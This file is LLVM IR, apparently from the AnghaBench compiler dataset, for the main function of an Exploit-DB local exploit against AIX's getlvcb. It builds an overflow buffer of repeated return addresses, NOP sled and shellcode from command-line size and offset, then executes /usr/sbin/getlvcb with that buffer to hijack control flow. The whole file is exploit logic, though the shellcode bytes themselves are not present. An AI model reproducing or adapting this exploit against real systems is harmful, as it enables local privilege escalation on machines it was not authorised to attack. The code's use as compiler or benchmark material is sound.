; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_23841.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_23841.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@OFFSET = common dso_local global i32 0, align 4
@BUFFERSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [3 x i8] c"-h\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"-H\00", align 1
@.str.2 = private unnamed_addr constant [38 x i8] c"\0A\09Usage:  %s <buffer size> <offset>\0A\0A\00", align 1
@RETURNADDR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [63 x i8] c"\0ASecure Network Operations (written by: mattox@secnetops.com)\0A\00", align 1
@.str.4 = private unnamed_addr constant [29 x i8] c"AIX Local getlvncb exploit\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [38 x i8] c"Fixin to overwrite the address: 0x%x\0A\00", align 1
@.str.6 = private unnamed_addr constant [28 x i8] c"Using a buffer size of: %i\0A\00", align 1
@.str.7 = private unnamed_addr constant [22 x i8] c"And an offset of: %i\0A\00", align 1
@.str.8 = private unnamed_addr constant [27 x i8] c"Coundn't allocate memory.\0A\00", align 1
@NOP = common dso_local global i64 0, align 8
@shellcode = common dso_local global i32* null, align 8
@.str.9 = private unnamed_addr constant [18 x i8] c"/usr/sbin/getlvcb\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"getlvcb\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* @OFFSET, align 4
  store i32 %14, i32* %7, align 4
  %15 = load i32, i32* @BUFFERSIZE, align 4
  store i32 %15, i32* %8, align 4
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 1
  %18 = load i8*, i8** %17, align 8
  %19 = icmp ne i8* %18, null
  br i1 %19, label %20, label %39

20:                                               ; preds = %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = call i64 @strncmp(i8* %23, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i32 3)
  %25 = icmp eq i64 %24, 0
  br i1 %25, label %32, label %26

26:                                               ; preds = %20
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = load i8*, i8** %28, align 8
  %30 = call i64 @strncmp(i8* %29, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i32 3)
  %31 = icmp eq i64 %30, 0
  br i1 %31, label %32, label %38

32:                                               ; preds = %26, %20
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 0
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0), i8* %35)
  %37 = call i32 @exit(i32 0) #3
  unreachable

38:                                               ; preds = %26
  br label %39

39:                                               ; preds = %38, %2
  %40 = load i32, i32* %4, align 4
  %41 = icmp sgt i32 %40, 1
  br i1 %41, label %42, label %47

42:                                               ; preds = %39
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @atoi(i8* %45)
  store i32 %46, i32* %8, align 4
  br label %47

47:                                               ; preds = %42, %39
  %48 = load i32, i32* %4, align 4
  %49 = icmp sgt i32 %48, 2
  br i1 %49, label %50, label %55

50:                                               ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 2
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @atoi(i8* %53)
  store i32 %54, i32* %7, align 4
  br label %55

55:                                               ; preds = %50, %47
  %56 = load i32, i32* @RETURNADDR, align 4
  %57 = load i32, i32* %7, align 4
  %58 = sub nsw i32 %56, %57
  %59 = sext i32 %58 to i64
  store i64 %59, i64* %10, align 8
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.3, i64 0, i64 0))
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.4, i64 0, i64 0))
  %62 = load i64, i64* %10, align 8
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0), i64 %62)
  %64 = load i32, i32* %8, align 4
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.6, i64 0, i64 0), i32 %64)
  %66 = load i32, i32* %7, align 4
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i64 0, i64 0), i32 %66)
  %68 = load i32, i32* %8, align 4
  %69 = call i8* @malloc(i32 %68)
  store i8* %69, i8** %12, align 8
  %70 = icmp ne i8* %69, null
  br i1 %70, label %74, label %71

71:                                               ; preds = %55
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0))
  %73 = call i32 @exit(i32 0) #3
  unreachable

74:                                               ; preds = %55
  %75 = load i8*, i8** %12, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 -1
  store i8* %76, i8** %13, align 8
  %77 = load i8*, i8** %13, align 8
  %78 = bitcast i8* %77 to i64*
  store i64* %78, i64** %11, align 8
  store i32 0, i32* %6, align 4
  br label %79

79:                                               ; preds = %87, %74
  %80 = load i32, i32* %6, align 4
  %81 = load i32, i32* %8, align 4
  %82 = icmp slt i32 %80, %81
  br i1 %82, label %83, label %90

83:                                               ; preds = %79
  %84 = load i64, i64* %10, align 8
  %85 = load i64*, i64** %11, align 8
  %86 = getelementptr inbounds i64, i64* %85, i32 1
  store i64* %86, i64** %11, align 8
  store i64 %84, i64* %85, align 8
  br label %87

87:                                               ; preds = %83
  %88 = load i32, i32* %6, align 4
  %89 = add nsw i32 %88, 4
  store i32 %89, i32* %6, align 4
  br label %79

90:                                               ; preds = %79
  store i32 0, i32* %6, align 4
  br label %91

91:                                               ; preds = %103, %90
  %92 = load i32, i32* %6, align 4
  %93 = load i32, i32* %8, align 4
  %94 = sdiv i32 %93, 2
  %95 = icmp slt i32 %92, %94
  br i1 %95, label %96, label %106

96:                                               ; preds = %91
  %97 = load i64, i64* @NOP, align 8
  %98 = trunc i64 %97 to i8
  %99 = load i8*, i8** %12, align 8
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  store i8 %98, i8* %102, align 1
  br label %103

103:                                              ; preds = %96
  %104 = load i32, i32* %6, align 4
  %105 = add nsw i32 %104, 4
  store i32 %105, i32* %6, align 4
  br label %91

106:                                              ; preds = %91
  %107 = load i8*, i8** %12, align 8
  %108 = load i32, i32* %8, align 4
  %109 = sdiv i32 %108, 2
  %110 = load i32*, i32** @shellcode, align 8
  %111 = call i32 @strlen(i32* %110)
  %112 = sdiv i32 %111, 2
  %113 = sub nsw i32 %109, %112
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %107, i64 %114
  store i8* %115, i8** %13, align 8
  store i32 0, i32* %6, align 4
  br label %116

116:                                              ; preds = %130, %106
  %117 = load i32, i32* %6, align 4
  %118 = load i32*, i32** @shellcode, align 8
  %119 = call i32 @strlen(i32* %118)
  %120 = icmp slt i32 %117, %119
  br i1 %120, label %121, label %133

121:                                              ; preds = %116
  %122 = load i32*, i32** @shellcode, align 8
  %123 = load i32, i32* %6, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i32, i32* %122, i64 %124
  %126 = load i32, i32* %125, align 4
  %127 = trunc i32 %126 to i8
  %128 = load i8*, i8** %13, align 8
  %129 = getelementptr inbounds i8, i8* %128, i32 1
  store i8* %129, i8** %13, align 8
  store i8 %127, i8* %128, align 1
  br label %130

130:                                              ; preds = %121
  %131 = load i32, i32* %6, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %6, align 4
  br label %116

133:                                              ; preds = %116
  %134 = load i8*, i8** %12, align 8
  %135 = load i32, i32* %8, align 4
  %136 = sub nsw i32 %135, 1
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %134, i64 %137
  store i8 0, i8* %138, align 1
  %139 = load i8*, i8** %12, align 8
  %140 = call i32 @execl(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0), i8* %139, i32 0)
  %141 = load i8*, i8** %12, align 8
  %142 = call i32 @free(i8* %141)
  ret i32 0
}

declare dso_local i64 @strncmp(i8*, i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
